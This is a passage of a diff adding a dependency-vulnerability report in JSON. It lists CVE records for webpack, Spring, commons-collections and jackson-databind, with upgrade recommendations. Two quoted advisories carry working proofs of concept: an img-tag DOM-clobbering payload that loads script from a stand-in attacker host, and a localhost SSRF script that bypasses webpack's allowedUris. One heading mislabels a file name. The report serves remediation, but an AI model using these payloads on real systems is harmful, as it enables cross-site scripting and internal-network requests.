follows:\n```\nconst path = require(\u0026#39;path\u0026#39;);\n\nmodule.exports = {\n  entry: \u0026#39;./entry.js\u0026#39;, // Ensure the correct path to your entry file\n  output: {\n    filename: \u0026#39;webpack-gadgets.bundle.js\u0026#39;, // Output bundle file\n    path: path.resolve(__dirname, \u0026#39;dist\u0026#39;), // Output directory\n    publicPath: \u0026#34;auto\u0026#34;, // Or leave this field not set\n  },\n  target: \u0026#39;web\u0026#39;,\n  mode: \u0026#39;development\u0026#39;,\n};\n```\n\nWhen the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker\u0026#39;s domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website\u0026#39;s feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n```\n\u0026lt;!DOCTYPE html\u0026gt;\n\u0026lt;html\u0026gt;\n\u0026lt;head\u0026gt;\n  \u0026lt;title\u0026gt;Webpack Example\u0026lt;/title\u0026gt;\n  \u0026lt;!-- Attacker-controlled Script-less HTML Element starts--!\u0026gt;\n  \u0026lt;img name=\u0026#34;currentScript\u0026#34; src=\u0026#34;https://attacker.controlled.server/\u0026#34;\u0026gt;\u0026lt;/img\u0026gt;\n  \u0026lt;!-- Attacker-controlled Script-less HTML Element ends--!\u0026gt;\n\u0026lt;/head\u0026gt;\n\u0026lt;script src=\u0026#34;./dist/webpack-gadgets.bundle.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\n\u0026lt;body\u0026gt;\n\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n```\n\n### Impact\n\nThis vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.\n\n### Patch\n\nA possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174\n\n```\n/******/ \t/* webpack/runtime/publicPath */\n/******/ \t(() =\u0026gt; {\n/******/ \t\tvar scriptUrl;\n/******/ \t\tif (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + \u0026#34;\u0026#34;;\n/******/ \t\tvar document = __webpack_require__.g.document;\n/******/ \t\tif (!scriptUrl \u0026amp;\u0026amp; document) {\n/******/ \t\t\tif (document.currentScript \u0026amp;\u0026amp; document.currentScript.tagName.toUpperCase() === \u0026#39;SCRIPT\u0026#39;) // Assume attacker cannot control script tag, otherwise it is XSS already :\u0026gt;\n/******/ \t\t\t\tscriptUrl = document.currentScript.src;\n/******/ \t\t\tif (!scriptUrl) {\n/******/ \t\t\t\tvar scripts = document.getElementsByTagName(\u0026#34;script\u0026#34;);\n/******/ \t\t\t\tif(scripts.length) {\n/******/ \t\t\t\t\tvar i = scripts.length - 1;\n/******/ \t\t\t\t\twhile (i \u0026gt; -1 \u0026amp;\u0026amp; (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;\n/******/ \t\t\t\t}\n/******/ \t\t\t}\n/******/ \t\t}\n/******/ \t\t// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\n/******/ \t\t// or pass an empty string (\u0026#34;\u0026#34;) and set the __webpack_public_path__ variable from your code to use your own logic.\n/******/ \t\tif (!scriptUrl) throw new Error(\u0026#34;Automatic publicPath is not supported in this browser\u0026#34;);\n/******/ \t\tscriptUrl = scriptUrl.replace(/#.*$/, \u0026#34;\u0026#34;).replace(/\\?.*$/, \u0026#34;\u0026#34;).replace(/\\/[^\\/]+$/, \u0026#34;/\u0026#34;);\n/******/ \t\t__webpack_require__.p = scriptUrl;\n/******/ \t})();\n```\n\nPlease note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.",
+      "severity": "HIGH",
+      "cvss_score": 7,
+      "affected_package": "webpack",
+      "recommendation": "Upgrade webpack from 5.50.0 to 5.94.0 to fix CVE-2024-43788. Run: npm install webpack@5.94.0.",
+      "ecosystem": "npm"
+    },
+    {
+      "cve_id": "CVE-2025-68458",
+      "published": "2026-02-05T18:38:10Z",
+      "lastModified": "2026-02-14T01:58:47.054966Z",
+      "current_version": "5.50.0",
+      "fixed_version": "5.104.1",
+      "description": "webpack buildHttp: allowedUris allow-list bypass via URL userinfo (@) leading to build-time SSRF behavior. ### Summary\nWhen `experiments.buildHttp` is enabled, webpack’s HTTP(S) resolver (`HttpUriPlugin`) can be bypassed to fetch resources from **hosts outside `allowedUris`** by using crafted URLs that include **userinfo** (`username:password@host`). If `allowedUris` enforcement relies on a **raw string prefix check** (e.g., `uri.startsWith(allowed)`), a URL that *looks* allow-listed can pass validation while the actual network request is sent to a different authority/host after URL parsing. This is a **policy/allow-list bypass** that enables **build-time SSRF behavior** (outbound requests from the build machine to internal-only endpoints, depending on network access) and **untrusted content inclusion** (the fetched response is treated as module source and bundled). In my reproduction, the internal response was also persisted in the buildHttp cache.\n\nReproduced on:\n- webpack version: **5.104.0**\n- Node version: **v18.19.1**\n\n### Details\n**Root cause (high level):** `allowedUris` validation can be performed on the raw URI string, while the actual request destination is determined later by parsing the URL (e.g., `new URL(uri)`), which interprets the **authority** as the part after `@`.\n\nExample crafted URL:\n- `http://127.0.0.1:9000@127.0.0.1:9100/secret.js`\n\nIf the allow-list is `[\u0026#34;http://127.0.0.1:9000\u0026#34;]`, then:\n- Raw string check:  \n  `crafted.startsWith(\u0026#34;http://127.0.0.1:9000\u0026#34;)` → **true**\n- URL parsing (WHAT `new URL()` will contact):  \n  `origin` → `http://127.0.0.1:9100` (host/port after `@`)\n\nAs a result, webpack fetches `http://127.0.0.1:9100/secret.js` even though `allowedUris` only included `http://127.0.0.1:9000`.\n\n**Evidence from reproduction:**\n- Server logs showed the internal-only endpoint being fetched:\n  - `[internal] 200 /secret.js served (...)` (observed multiple times)\n- Attacker-side build output showed:\n  - the internal secret marker was present in the **bundle**\n  - the internal secret marker was present in the **buildHttp cache**\n\n\u0026lt;img width=\u0026#34;1651\u0026#34; height=\u0026#34;381\u0026#34; alt=\u0026#34;image-2\u0026#34; src=\u0026#34;https://github.com/user-attachments/assets/8fd81b35-0d4f-424b-b60e-0a2582a8b492\u0026#34; /\u0026gt;\n\n### PoC\nThis PoC is intentionally constrained to **127.0.0.1** (localhost-only “internal service”) to demonstrate SSRF behavior safely.\n\n#### 1) Setup\n```bash\nmkdir split-userinfo-poc \u0026amp;\u0026amp; cd split-userinfo-poc\nnpm init -y\nnpm i -D webpack webpack-cli\n```\n\n#### 2) Create server.js\n```js\n#!/usr/bin/env node\n\u0026#34;use strict\u0026#34;;\n\nconst http = require(\u0026#34;http\u0026#34;);\n\nconst ALLOWED_PORT = 9000;   // allowlisted-looking host\nconst INTERNAL_PORT = 9100;  // actual target if bypass succeeds\n\nconst secret = `INTERNAL_ONLY_SECRET_${Math.random().toString(16).slice(2)}`;\nconst internalPayload =\n  `// internal-only\\n` +\n  `export const secret = ${JSON.stringify(secret)};\\n` +\n  `export default \u0026#34;ok\u0026#34;;\\n`;\n\nfunction listen(port, handler) {\n  return new Promise(resolve =\u0026gt; {\n    const s = http.createServer(handler);\n    s.listen(port, \u0026#34;127.0.0.1\u0026#34;, () =\u0026gt; resolve(s));\n  });\n}\n\n(async () =\u0026gt; {\n  // \u0026#34;Allowed\u0026#34; host (should NOT be contacted if bypass works as intended)\n  await listen(ALLOWED_PORT, (req, res) =\u0026gt; {\n    console.log(`[allowed-host] ${req.method} ${req.url} (should NOT be hit in userinfo bypass)`);\n    res.statusCode = 200;\n    res.setHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/javascript; charset=utf-8\u0026#34;);\n    res.end(`export default \u0026#34;ALLOWED_HOST_WAS_HIT_UNEXPECTEDLY\u0026#34;;\\n`);\n  });\n\n  // Internal-only service (SSRF-like target)\n  await listen(INTERNAL_PORT, (req, res) =\u0026gt; {\n    if (req.url === \u0026#34;/secret.js\u0026#34;) {\n      console.log(`[internal] 200 /secret.js served (secret=${secret})`);\n      res.statusCode = 200;\n      res.setHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/javascript; charset=utf-8\u0026#34;);\n      res.end(internalPayload);\n      return;\n    }\n    console.log(`[internal] 404 ${req.method} ${req.url}`);\n    res.statusCode = 404;\n    res.end(\u0026#34;not found\u0026#34;);\n  });\n\n  console.log(\u0026#34;\\nServers up:\u0026#34;);\n  console.log(`- allowed-host (should NOT be contacted): http://127.0.0.1:${ALLOWED_PORT}/`);\n  console.log(`- internal target (should be contacted if vulnerable): http://127.0.0.1:${INTERNAL_PORT}/secret.js`);\n})();\n```\n\n#### 2) Create server.js\n```js\n#!/usr/bin/env node\n\u0026#34;use strict\u0026#34;;\n\nconst path = require(\u0026#34;path\u0026#34;);\nconst os = require(\u0026#34;os\u0026#34;);\nconst fs = require(\u0026#34;fs/promises\u0026#34;);\nconst webpack = require(\u0026#34;webpack\u0026#34;);\n\nfunction fmtBool(b) { return b ? \u0026#34;✅\u0026#34; : \u0026#34;❌\u0026#34;; }\n\nasync function walk(dir) {\n  const out = [];\n  let items;\n  try { items = await fs.readdir(dir, { withFileTypes: true }); }\n  catch { return out; }\n  for (const it of items) {\n    const p = path.join(dir, it.name);\n    if (it.isDirectory()) out.push(...await walk(p));\n    else if (it.isFile()) out.push(p);\n  }\n  return out;\n}\n\nasync function fileContains(f, needle) {\n  try {\n    const buf = await fs.readFile(f);\n    const s1 = buf.toString(\u0026#34;utf8\u0026#34;);\n    if (s1.includes(needle)) return true;\n    const s2 = buf.toString(\u0026#34;latin1\u0026#34;);\n    return s2.includes(needle);\n  } catch {\n    return false;\n  }\n}\n\n(async () =\u0026gt; {\n  const webpackVersion = require(\u0026#34;webpack/package.json\u0026#34;).version;\n\n  const ALLOWED_PORT = 9000;\n  const INTERNAL_PORT = 9100;\n\n  // NOTE: allowlist is intentionally specified without a trailing slash\n  // to demonstrate the risk of raw string prefix checks.\n  const allowedUri = `http://127.0.0.1:${ALLOWED_PORT}`;\n\n  // Crafted URL using userinfo so that:\n  // - The string begins with allowedUri\n  // - The actual authority (host:port) after \u0026#39;@\u0026#39; is INTERNAL_PORT\n  const crafted = `http://127.0.0.1:${ALLOWED_PORT}@127.0.0.1:${INTERNAL_PORT}/secret.js`;\n  const parsed = new URL(crafted);\n\n  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), \u0026#34;webpack-httpuri-userinfo-poc-\u0026#34;));\n  const srcDir = path.join(tmp, \u0026#34;src\u0026#34;);\n  const distDir = path.join(tmp, \u0026#34;dist\u0026#34;);\n  const cacheDir = path.join(tmp, \u0026#34;.buildHttp-cache\u0026#34;);\n  const lockfile = path.join(tmp, \u0026#34;webpack.lock\u0026#34;);\n  const bundlePath = path.join(distDir, \u0026#34;bundle.js\u0026#34;);\n\n  await fs.mkdir(srcDir, { recursive: true });\n  await fs.mkdir(distDir, { recursive: true });\n\n  await fs.writeFile(\n    path.join(srcDir, \u0026#34;index.js\u0026#34;),\n    `import { secret } from ${JSON.stringify(crafted)};\nconsole.log(\u0026#34;LEAKED_SECRET:\u0026#34;, secret);\nexport default secret;\n`\n  );\n\n  const config = {\n    context: tmp,\n    mode: \u0026#34;development\u0026#34;,\n    entry: \u0026#34;./src/index.js\u0026#34;,\n    output: { path: distDir, filename: \u0026#34;bundle.js\u0026#34; },\n    experiments: {\n      buildHttp: {\n        allowedUris: [allowedUri],\n        cacheLocation: cacheDir,\n        lockfileLocation: lockfile,\n        upgrade: true\n      }\n    }\n  };\n\n  console.log(\u0026#34;\\n[ENV]\u0026#34;);\n  console.log(`- webpack version: ${webpackVersion}`);\n  console.log(`- node version:    ${process.version}`);\n  console.log(`- allowedUris:     ${JSON.stringify([allowedUri])}`);\n\n  console.log(\u0026#34;\\n[CRAFTED URL]\u0026#34;);\n  console.log(`- import specifier: ${crafted}`);\n  console.log(`- WHAT startsWith() sees: begins with \u0026#34;${allowedUri}\u0026#34; =\u0026gt; ${fmtBool(crafted.startsWith(allowedUri))}`);\n  console.log(`- WHAT URL() parses:`);\n  console.log(`  - username: ${JSON.stringify(parsed.username)} (userinfo)`);\n  console.log(`  - password: ${JSON.stringify(parsed.password)} (userinfo)`);\n  console.log(`  - hostname: ${parsed.hostname}`);\n  console.log(`  - port:     ${parsed.port}`);\n  console.log(`  - origin:   ${parsed.origin}`);\n  console.log(`  - NOTE: request goes to origin above (host/port after @), not to \u0026#34;${allowedUri}\u0026#34;`);\n\n  const compiler = webpack(config);\n\n  compiler.run(async (err, stats) =\u0026gt; {\n    try {\n      if (err) throw err;\n      const info = stats.toJson({ all: false, errors: true, warnings: true });\n\n      if (stats.hasErrors()) {\n        console.error(\u0026#34;\\n[WEBPACK ERRORS]\u0026#34;);\n        console.error(info.errors);\n        process.exitCode = 1;\n        return;\n      }\n\n      const bundle = await fs.readFile(bundlePath, \u0026#34;utf8\u0026#34;);\n      const m = bundle.match(/INTERNAL_ONLY_SECRET_[0-9a-f]+/i);\n      const foundSecret = m ? m[0] : null;\n\n      console.log(\u0026#34;\\n[RESULT]\u0026#34;);\n      console.log(`- temp dir:  ${tmp}`);\n      console.log(`- bundle:    ${bundlePath}`);\n      console.log(`- lockfile:  ${lockfile}`);\n      console.log(`- cacheDir:  ${cacheDir}`);\n\n      console.log(\u0026#34;\\n[SECURITY CHECK]\u0026#34;);\n      console.log(`- bundle contains INTERNAL_ONLY_SECRET_* : ${fmtBool(!!foundSecret)}`);\n\n      if (foundSecret) {\n        const lockHit = await fileContains(lockfile, foundSecret);\n\n        const cacheFiles = await walk(cacheDir);\n        let cacheHit = false;\n        for (const f of cacheFiles) {\n          if (await fileContains(f, foundSecret)) { cacheHit = true; break; }\n        }\n\n        console.log(`- lockfile contains secret: ${fmtBool(lockHit)}`);\n        console.log(`- cache contains secret:    ${fmtBool(cacheHit)}`);\n      }\n    } catch (e) {\n      console.error(e);\n      process.exitCode = 1;\n    } finally {\n      compiler.close(() =\u0026gt; {});\n    }\n  });\n})();\n```\n\n\n#### 4) Run\nTerminal A:\n```bash\nnode server.js\n```\n\nTerminal B:\n```bash\nnode attacker.js\n```\n\n#### 5) Expected vs Actual\n\nExpected: The import should be blocked because the effective request destination is http://127.0.0.1:9100/secret.js, which is outside allowedUris (only http://127.0.0.1:9000 is allow-listed).\n\nActual: The crafted URL passes the allow-list prefix validation, webpack fetches the internal-only resource on port 9100 (confirmed by server logs), and the secret marker appears in the bundle and buildHttp cache.\n\n### Impact\n\nVulnerability class: Policy/allow-list bypass leading to build-time SSRF behavior and untrusted content inclusion in build outputs.\n\nWho is impacted: Projects that enable experiments.buildHttp and rely on allowedUris as a security boundary. If an attacker can influence the imported HTTP(S) specifier (e.g., via source contribution, dependency manipulation, or configuration), they can cause outbound requests from the build environment to endpoints outside the allow-list (including internal-only services, subject to network reachability). The fetched response can be treated as module source and included in build outputs and persisted in the buildHttp cache, increasing the risk of leakage or supply-chain contamination.",
+      "severity": "MEDIUM",
+      "cvss_score": 4,
+      "affected_package": "webpack",
+      "recommendation": "Upgrade webpack from 5.50.0 to 5.104.1 to fix CVE-2025-68458. Run: npm install webpack@5.104.1.",
+      "ecosystem": "npm"
+    },
+    {
+      "cve_id": "CVE-2023-28154",
+      "published": "2023-03-13T03:30:15Z",
+      "lastModified": "2023-11-08T04:12:09.414542Z",
+      "current_version": "5.50.0",
+      "fixed_version": "5.76.0",
+      "description": "Cross-realm object access in Webpack 5. Webpack 5 before 5.76.0 does not avoid cross-realm object access. ImportParserPlugin.js mishandles the magic comment feature. An attacker who controls a property of an untrusted object can obtain access to the real global object.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "webpack",
+      "recommendation": "Upgrade webpack from 5.50.0 to 5.76.0 to fix CVE-2023-28154. Run: npm install webpack@5.76.0.",
+      "ecosystem": "npm"
+    },
+    {
+      "cve_id": "CVE-2024-38809",
+      "published": "2024-09-24T18:34:43Z",
+      "lastModified": "2026-02-04T03:41:13.020256Z",
+      "current_version": "${spring.version}",
+      "description": "Spring Framework DoS via conditional HTTP request. ### Description\nApplications that parse ETags from `If-Match` or `If-None-Match` request headers are vulnerable to DoS attack.\n\n### Affected Spring Products and Versions\norg.springframework:spring-web in versions \n\n6.1.0 through 6.1.11\n6.0.0 through 6.0.22\n5.3.0 through 5.3.37\n\nOlder, unsupported versions are also affected\n\n### Mitigation\nUsers of affected versions should upgrade to the corresponding fixed version.\n6.1.x -\u0026gt; 6.1.12\n6.0.x -\u0026gt; 6.0.23\n5.3.x -\u0026gt; 5.3.38\nNo other mitigation steps are necessary.\n\nUsers of older, unsupported versions could enforce a size limit on `If-Match` and `If-None-Match` headers, e.g. through a Filter.",
+      "severity": "LOW",
+      "cvss_score": 2,
+      "affected_package": "org.springframework:spring-web",
+      "recommendation": "Monitor org.springframework:spring-web (CVE-2024-38809) for updates and upgrade when a fix becomes available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2024-22262",
+      "published": "2024-04-16T06:30:28Z",
+      "lastModified": "2026-04-17T19:29:23.512712553Z",
+      "current_version": "${spring.version}",
+      "description": "Spring Framework URL Parsing with Host Validation. Applications that use UriComponentsBuilder to parse an externally provided URL (e.g. through a query parameter) AND perform validation checks on the host of the parsed URL may be vulnerable to a  open redirect https://cwe.mitre.org/data/definitions/601.html  attack or to a SSRF attack if the URL is used after passing validation checks.\n\nThis is the same as  CVE-2024-22259 https://spring.io/security/cve-2024-22259  and  CVE-2024-22243 https://spring.io/security/cve-2024-22243 , but with different input.",
+      "severity": "MEDIUM",
+      "cvss_score": 6,
+      "affected_package": "org.springframework:spring-web",
+      "recommendation": "No fixed version for org.springframework:spring-web (CVE-2024-22262). Limit exposure, avoid vulnerable functionality, and monitor for updates.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2024-38820",
+      "published": "2024-10-18T06:30:32Z",
+      "lastModified": "2026-02-04T04:13:07.093622Z",
+      "current_version": "${spring.version}",
+      "description": "Spring Framework DataBinder Case Sensitive Match Exception. The fix for CVE-2022-22968 made disallowedFields patterns in DataBinder case insensitive. However, String.toLowerCase() has some Locale dependent exceptions that could potentially result in fields not protected as expected.",
+      "severity": "LOW",
+      "cvss_score": 2,
+      "affected_package": "org.springframework:spring-web",
+      "recommendation": "Monitor org.springframework:spring-web (CVE-2024-38820) for updates and upgrade when a fix becomes available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2016-1000027",
+      "published": "2022-05-24T17:05:30Z",
+      "lastModified": "2026-02-04T02:53:42.698234Z",
+      "current_version": "${spring.version}",
+      "description": "Pivotal Spring Framework contains unsafe Java deserialization methods. Pivotal Spring Framework before 6.0.0 suffers from a potential remote code execution (RCE) issue if used for Java deserialization of untrusted data. Depending on how the library is implemented within a product, this issue may or not occur, and authentication may be required.\n\nMaintainers recommend investigating alternative components or a potential mitigating control. Version 4.2.6 and 3.2.17 contain [enhanced documentation](https://github.com/spring-projects/spring-framework/commit/5cbe90b2cd91b866a5a9586e460f311860e11cfa) advising users to take precautions against unsafe Java deserialization, version 5.3.0 [deprecate the impacted classes](https://github.com/spring-projects/spring-framework/issues/25379) and version 6.0.0 [removed it entirely](https://github.com/spring-projects/spring-framework/issues/27422).",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "org.springframework:spring-web",
+      "recommendation": "No patched version is available for org.springframework:spring-web (CVE-2016-1000027). Consider removing or replacing this dependency, or apply vendor patches if available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2015-3192",
+      "published": "2018-10-17T20:29:12Z",
+      "lastModified": "2024-03-15T05:46:26.165089Z",
+      "current_version": "${spring.version}",
+      "description": "Pivotal Spring Framework DoS Attack with XML Input. Pivotal Spring Framework before 3.2.14 and 4.x before 4.1.7 do not properly process inline DTD declarations when DTD is not entirely disabled, which allows remote attackers to cause a denial of service (memory consumption and out-of-memory errors) via a crafted XML file.",
+      "severity": "MEDIUM",
+      "cvss_score": 4,
+      "affected_package": "org.springframework:spring-web",
+      "recommendation": "No fixed version for org.springframework:spring-web (CVE-2015-3192). Limit exposure, avoid vulnerable functionality, and monitor for updates.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2024-22243",
+      "published": "2024-02-23T06:30:31Z",
+      "lastModified": "2026-02-04T03:35:25.288455Z",
+      "current_version": "${spring.version}",
+      "description": "Spring Web vulnerable to Open Redirect or Server Side Request Forgery. Applications that use UriComponentsBuilder to parse an externally provided URL (e.g. through a query parameter) AND perform validation checks on the host of the parsed URL may be vulnerable to a  open redirect attack or to a SSRF attack if the URL is used after passing validation checks.",
+      "severity": "MEDIUM",
+      "cvss_score": 6,
+      "affected_package": "org.springframework:spring-web",
+      "recommendation": "No fixed version for org.springframework:spring-web (CVE-2024-22243). Limit exposure, avoid vulnerable functionality, and monitor for updates.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2013-6429",
+      "published": "2022-05-13T01:02:39Z",
+      "lastModified": "2024-12-04T05:41:42.939748Z",
+      "current_version": "${spring.version}",
+      "description": "Cross-Site Request Forgery in Spring Framework. The SourceHttpMessageConverter in Spring MVC in Spring Framework before 3.2.5 and 4.0.0.M1 through 4.0.0.RC1 does not disable external entity resolution, which allows remote attackers to read arbitrary files, cause a denial of service, and conduct CSRF attacks via crafted XML, aka an XML External Entity (XXE) issue, and a different vulnerability than CVE-2013-4152 and CVE-2013-7315.",
+      "severity": "MEDIUM",
+      "cvss_score": 5,
+      "affected_package": "org.springframework:spring-web",
+      "recommendation": "No fixed version for org.springframework:spring-web (CVE-2013-6429). Limit exposure, avoid vulnerable functionality, and monitor for updates.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2024-22259",
+      "published": "2024-03-16T06:30:27Z",
+      "lastModified": "2026-02-04T02:37:54.422465Z",
+      "current_version": "${spring.version}",
+      "description": "Spring Framework URL Parsing with Host Validation Vulnerability. Applications that use UriComponentsBuilder in Spring Framework to parse an externally provided URL (e.g. through a query parameter) AND perform validation checks on the host of the parsed URL may be vulnerable to a  open redirect https://cwe.mitre.org/data/definitions/601.html  attack or to a SSRF attack if the URL is used after passing validation checks.\n\nThis is the same as  CVE-2024-22243 https://spring.io/security/cve-2024-22243, but with different input.",
+      "severity": "MEDIUM",
+      "cvss_score": 6,
+      "affected_package": "org.springframework:spring-web",
+      "recommendation": "No fixed version for org.springframework:spring-web (CVE-2024-22259). Limit exposure, avoid vulnerable functionality, and monitor for updates.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2013-6430",
+      "published": "2022-05-05T00:29:18Z",
+      "lastModified": "2025-07-03T20:36:14.698961Z",
+      "current_version": "${spring.version}",
+      "description": "Improper Neutralization of Input During Web Page Generation in Spring Framework. The JavaScriptUtils.javaScriptEscape method in web/util/JavaScriptUtils.java in Spring MVC in Spring Framework before 3.2.2 does not properly escape certain characters, which allows remote attackers to conduct cross-site scripting (XSS) attacks via a (1) line separator or (2) paragraph separator Unicode character or (3) left or (4) right angle bracket.",
+      "severity": "LOW",
+      "cvss_score": 2,
+      "affected_package": "org.springframework:spring-web",
+      "recommendation": "Monitor org.springframework:spring-web (CVE-2013-6430) for updates and upgrade when a fix becomes available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2015-6420",
+      "published": "2020-06-15T20:36:20Z",
+      "lastModified": "2024-11-28T05:40:45.267146Z",
+      "current_version": "3.2.1",
+      "fixed_version": "4.1",
+      "description": "Insecure Deserialization in Apache Commons Collection. Serialized-object interfaces in Java applications using the Apache Commons Collections (ACC) library may allow remote attackers to execute arbitrary commands via a crafted serialized Java object.",
+      "severity": "HIGH",
+      "cvss_score": 7.5,
+      "affected_package": "commons-collections:commons-collections",
+      "recommendation": "Upgrade commons-collections:commons-collections from 3.2.1 to 4.1 to fix CVE-2015-6420. Update version in pom.xml to 4.1.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2015-7501",
+      "published": "2022-05-13T01:25:20Z",
+      "lastModified": "2024-02-17T05:22:18.562352Z",
+      "current_version": "3.2.1",
+      "fixed_version": "3.2.2",
+      "description": "Deserialization of Untrusted Data in Apache commons collections. It was found that the Apache commons-collections library permitted code execution when deserializing objects involving a specially constructed chain of classes. A remote attacker could use this flaw to execute arbitrary code with the permissions of the application using the commons-collections library.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "commons-collections:commons-collections",
+      "recommendation": "Upgrade commons-collections:commons-collections from 3.2.1 to 3.2.2 to fix CVE-2015-7501. Update version in pom.xml to 3.2.2.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2020-36518",
+      "published": "2022-03-12T00:00:36Z",
+      "lastModified": "2026-02-04T04:26:14.546092Z",
+      "current_version": "${jackson.version}",
+      "description": "Deeply nested json in jackson-databind. jackson-databind is a data-binding package for the Jackson Data Processor. jackson-databind allows a Java stack overflow exception and denial of service via a large depth of nested objects.",
+      "severity": "MEDIUM",
+      "cvss_score": 4,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "No fixed version for com.fasterxml.jackson.core:jackson-databind (CVE-2020-36518). Limit exposure, avoid vulnerable functionality, and monitor for updates.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2021-20190",
+      "published": "2021-01-20T21:20:15Z",
+      "lastModified": "2025-09-15T07:42:14.888352Z",
+      "current_version": "${jackson.version}",
+      "description": "Deserialization of untrusted data in jackson-databind. A flaw was found in jackson-databind before 2.9.10.7 and 2.6.7.5. FasterXML mishandles the interaction between serialization gadgets and typing. The highest threat from this vulnerability is to data confidentiality and integrity as well as system availability.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "No patched version is available for com.fasterxml.jackson.core:jackson-databind (CVE-2021-20190). Consider removing or replacing this dependency, or apply vendor patches if available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2019-14379",
+      "published": "2019-08-01T19:18:00Z",
+      "lastModified": "2024-03-15T05:18:54.134884Z",
+      "current_version": "${jackson.version}",
+      "description": "Deserialization of untrusted data in FasterXML jackson-databind. SubTypeValidator.java in FasterXML jackson-databind before 2.9.9.2, 2.8.11.4, and 2.7.9.6 mishandles default typing when ehcache is used (because of net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup), leading to remote code execution.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "No patched version is available for com.fasterxml.jackson.core:jackson-databind (CVE-2019-14379). Consider removing or replacing this dependency, or apply vendor patches if available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2019-16335",
+      "published": "2019-09-23T18:33:45Z",
+      "lastModified": "2024-03-15T05:20:15.574552Z",
+      "current_version": "${jackson.version}",
+      "description": "Polymorphic Typing issue in FasterXML jackson-databind. A Polymorphic Typing issue was discovered in FasterXML jackson-databind before 2.9.10, 2.8.11.5, and 2.6.7.3. It is related to com.zaxxer.hikari.HikariDataSource. This is a different vulnerability than CVE-2019-14540.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "No patched version is available for com.fasterxml.jackson.core:jackson-databind (CVE-2019-16335). Consider removing or replacing this dependency, or apply vendor patches if available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2019-14892",
+      "published": "2020-05-15T18:58:58Z",
+      "lastModified": "2024-02-18T05:32:56.325249Z",
+      "current_version": "${jackson.version}",
+      "description": "Polymorphic deserialization of malicious object in jackson-databind. A flaw was discovered in jackson-databind in versions before 2.9.10, 2.8.11.5, and 2.6.7.3, where it would permit polymorphic deserialization of a malicious object using commons-configuration 1 and 2 JNDI classes. An attacker could use this flaw to execute arbitrary code.",
+      "severity": "LOW",
+      "cvss_score": 3,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "Monitor com.fasterxml.jackson.core:jackson-databind (CVE-2019-14892) for updates and upgrade when a fix becomes available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2018-7489",
+      "published": "2018-10-16T17:45:18Z",
+      "lastModified": "2024-03-15T01:18:46.938616Z",
+      "current_version": "${jackson.version}",
+      "description": "FasterXML jackson-databind allows unauthenticated remote code execution . FasterXML jackson-databind before before 2.6.7.5, 2.7.x before 2.7.9.3, 2.8.x before 2.8.11.1, and 2.9.x before 2.9.5 allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 deserialization flaw. This is exploitable by sending maliciously crafted JSON input to the readValue method of the ObjectMapper, bypassing a blacklist that is ineffective if the c3p0 libraries are available in the classpath.",
+      "severity": "CRITICAL",
+      "cvss_score": 9,
+      "affected_package": "com.fasterxml.jackson.core:jackson-databind",
+      "recommendation": "No patched version is available for com.fasterxml.jackson.core:jackson-databind (CVE-2018-7489). Consider removing or replacing this dependency, or apply vendor patches if available.",
+      "ecosystem": "Maven"
+    },
+    {
+      "cve_id": "CVE-2018-12022",
+      "published": "2019-03-25T18:03:09Z",
+      "lastModified": "2024-03-11T05:19:23.395848Z",
+      "current_version": "${jackson.version}",
